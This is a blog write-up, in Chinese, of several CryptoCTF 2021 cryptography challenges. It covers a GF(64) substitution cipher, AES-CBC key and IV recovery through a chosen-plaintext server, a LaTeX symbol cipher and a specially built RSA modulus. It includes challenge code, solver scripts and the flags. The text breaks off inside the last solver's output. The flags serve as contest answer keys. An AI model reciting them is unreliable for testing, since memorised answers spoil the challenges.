<blockquote>
<p>做不动了，附件下载下来之后才发现都是密码的题目，而且比我平时做的都难，所以这里就不做了，等着wp吧。</p>
</blockquote>
<h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h2><h3 id="mic-check"><a href="#mic-check" class="headerlink" title="mic check"></a>mic check</h3><p>直接在rules的那一栏里面的最下面就是flag</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210731162506226.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">CCTF&#123;W3lc0me_t0_The_0ne_&amp;_0nly_Crypt0_CTF_Mad3ـw1th_L0ve_f0r_Crypt0!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><h3 id="Farm"><a href="#Farm" class="headerlink" title="Farm"></a>Farm</h3><pre class="line-numbers language-none"><code class="language-none">Explore the Farm very carefully!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env sage</span>

<span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> string<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> math


ALPHABET <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\\='</span>

F <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> <span class="token punctuation">[</span>F<span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span>
    key <span class="token operator">=</span> math<span class="token punctuation">.</span>prod<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment"># Optimization the key length :D</span>
    <span class="token keyword">return</span> key


<span class="token keyword">def</span> <span class="token function">maptofarm</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> c <span class="token keyword">in</span> ALPHABET
    <span class="token keyword">return</span> F<span class="token punctuation">[</span>ALPHABET<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
    enc<span class="token punctuation">,</span> pkey <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> key <span class="token operator">**</span> <span class="token number">5</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">3</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> m64<span class="token punctuation">:</span>
        enc <span class="token operator">+=</span> ALPHABET<span class="token punctuation">[</span>F<span class="token punctuation">.</span>index<span class="token punctuation">(</span>pkey <span class="token operator">*</span> maptofarm<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> enc


<span class="token comment"># KEEP IT SECRET</span>
key <span class="token operator">=</span> keygen<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>  <span class="token comment"># I think 64**14 > 2**64 is not brute-forcible :P</span>

enc <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'enc = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>enc<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重点就是下面这个函数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> <span class="token punctuation">[</span>F<span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span>
    key <span class="token operator">=</span> math<span class="token punctuation">.</span>prod<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment"># Optimization the key length :D</span>
    <span class="token keyword">return</span> key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里对有限域GF(64)里的内容进行一个随机提取14位再进行prod()操作，prod也就是将list内的元素逐个相乘，而相乘的结果仍在有限域GF(64)内<strong>PS:这是有限域的特征</strong>，key就在长度为64的GF(64)列表里面。那我们就能针对这个进行爆破key</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env sage</span>

<span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> string<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> math

flag <span class="token operator">=</span> <span class="token string">b"thisisflag"</span>

ALPHABET <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\\='</span>

F <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

enc <span class="token operator">=</span> <span class="token string">'805c9GMYuD5RefTmabUNfS9N9YrkwbAbdZE0df91uCEytcoy9FDSbZ8Ay8jj'</span>

<span class="token keyword">def</span> <span class="token function">decrypto</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token punctuation">,</span> pkey <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> key <span class="token operator">**</span> <span class="token number">5</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">3</span> <span class="token operator">+</span> key <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> ALPHABET<span class="token punctuation">[</span>F<span class="token punctuation">.</span>index<span class="token punctuation">(</span>F<span class="token punctuation">[</span>ALPHABET<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">/</span> pkey<span class="token punctuation">)</span><span class="token punctuation">]</span>
    m <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">return</span> m


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> key <span class="token keyword">in</span> F<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> decrypto<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">b'CCTF'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token comment"># b'CCTF&#123;EnCrYp7I0n_4nD_5u8STitUtIn9_iN_Fi3Ld!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="KeyBase"><a href="#KeyBase" class="headerlink" title="KeyBase"></a>KeyBase</h3><pre class="line-numbers language-none"><code class="language-none">Recovering secrets is hard, but there is always some easy parts!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>是个CBC模式的aes，给出的key差了两个八比特，iv没给，但是可实现对key的爆破。而且可以进行选择明文攻击攻击，下面是AES-CBC的模式图:</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210812194759699.png" alt></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES

chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"01.cr.yp.toc.tf"</span><span class="token punctuation">,</span> <span class="token number">17010</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">bytesxor</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a <span class="token operator">^</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">)</span>


chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"[Q]uit\n"</span><span class="token punctuation">,</span> <span class="token string">b'g'</span><span class="token punctuation">)</span>
eflag <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'= '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment"># 重复输入x直到得到含前四位的enc</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"[Q]uit\n"</span><span class="token punctuation">,</span> <span class="token string">b't'</span><span class="token punctuation">)</span>
    chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"encrypt: \n"</span><span class="token punctuation">,</span> <span class="token string">b'x'</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">)</span>
    <span class="token comment"># 下面这两句接收server输入的语句一定要挨着</span>
    enc <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' = '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    key <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' = '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    prefix <span class="token operator">=</span> enc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">'*'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> prefix<span class="token punctuation">:</span>
        prefix <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>  <span class="token comment"># 这里将得到的十六进制转为byte，方便进行下面的bytesxor</span>
        <span class="token keyword">break</span>

<span class="token comment"># 对key进行爆破</span>
key <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00\x00"</span>
<span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> a
    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b
        <span class="token comment"># 根据AES的CBC模式，此处可以爆破出key，下面的if语句为 true 的条件。</span>
        <span class="token comment"># 这里没有iv初始向量的时候，使用ECB模式可以对块进行解密</span>
        <span class="token keyword">if</span> bytesxor<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>enc<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'xx'</span><span class="token punctuation">)</span> <span class="token operator">==</span> prefix<span class="token punctuation">:</span>
            <span class="token comment"># 下面得到的是前面16 bytes 的密文</span>
            cipher <span class="token operator">=</span> bytesxor<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>enc<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'x'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>
            <span class="token comment"># 下面得到的是iv将前面16 bytes的密文解密之后与16 bytes明文信息进行异或即可得到iv</span>
            iv <span class="token operator">=</span> bytesxor<span class="token punctuation">(</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'x'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>
            flag <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>eflag<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token comment"># b'CCTF&#123;h0W_R3cOVER_7He_5eCrET_1V?&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不是很难，考的很基础，就是一个key的爆破，与初始向量iv的恢复。</p>
<h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><pre class="line-numbers language-none"><code class="language-none">Oh, my eyes, my eyes! People still can solve this kind of cryptography? Mathematicians should love this one!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>类似古典密码，取的是latex的公式所用的单词的首字母</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210814140948835.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">\Cap \Cap \Theta \Finv \&#123; \Pi \ltimes \aleph y \_ \wp \infty \therefore \heartsuit \_ \Lsh \aleph \Theta \eth \Xi \&#125;
CCTF&#123;Play_with_LaTeX&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这种公式的符号有些类似于misc脑洞，但其实想到了是非常easy的，打眼一看是latex，就想到要使用latex的<code>\</code>后的首字母。</p>
<h2 id="medium-easy"><a href="#medium-easy" class="headerlink" title="medium-easy"></a>medium-easy</h2><h3 id="Hamul"><a href="#Hamul" class="headerlink" title="Hamul"></a>Hamul</h3><pre class="line-numbers language-none"><code class="language-none">RSA could be hard, or easy?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

flag <span class="token operator">=</span> <span class="token string">'test'</span>

nbit <span class="token operator">=</span> <span class="token number">64</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
	p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span>nbit<span class="token punctuation">)</span>
	P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>
	Q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
	PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span>
	QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>PP<span class="token punctuation">)</span> <span class="token keyword">and</span> isPrime<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">break</span>

n <span class="token operator">=</span> PP <span class="token operator">*</span> QQ
m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> m <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>
	c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里赛后根据别人的wp，因为这个<code>PP、QQ</code>的构造是独特的</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210814162251047.png" alt></p>
<p>也就是说，这个N的前几位是肯定等于<code>p*q</code>的高位的，而N的最后几位也肯定是等于<code>p*q</code>的低位的。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210814164357860.png" alt></p>
<p>可见前后19位是相同的，相当于<code>p*q</code>的前后19位都是可已知的，所以只需要对<code>p*q</code>的中间两位进行爆破即可。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> factordb<span class="token punctuation">.</span>factordb <span class="token keyword">import</span> FactorDB
<span class="token keyword">import</span> gmpy2

n <span class="token operator">=</span> <span class="token number">98027132963374134222724984677805364225505454302688777506193468362969111927940238887522916586024601699661401871147674624868439577416387122924526713690754043</span>
c <span class="token operator">=</span> <span class="token number">42066148309824022259115963832631631482979698275547113127526245628391950322648581438233116362337008919903556068981108710136599590349195987128718867420453399</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>
    Q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
    PP <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span>
    QQ <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>PP<span class="token punctuation">)</span> <span class="token keyword">and</span> isPrime<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span> <span class="token keyword">and</span> n <span class="token operator">==</span> PP <span class="token operator">*</span> QQ<span class="token punctuation">:</span>
        p<span class="token punctuation">,</span> q <span class="token operator">=</span> PP<span class="token punctuation">,</span> QQ
        phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
        m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            p_q <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            factor <span class="token operator">=</span> FactorDB<span class="token punctuation">(</span>p_q<span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                ans <span class="token operator">=</span> factor<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
                factors <span class="token operator">=</span> ans<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
                    <span class="token keyword">continue</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    p <span class="token operator">=</span> factors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                    q <span class="token operator">=</span> factors<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                    <span class="token keyword">if</span> check<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>
                        <span class="token keyword">return</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    solve<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
b'CCTF&#123;wH3Re_0Ur_Br41N_Iz_5uP3R_4CtIVe_bY_RSA!!&#125;'
9324884768249686093 10512422984265378151
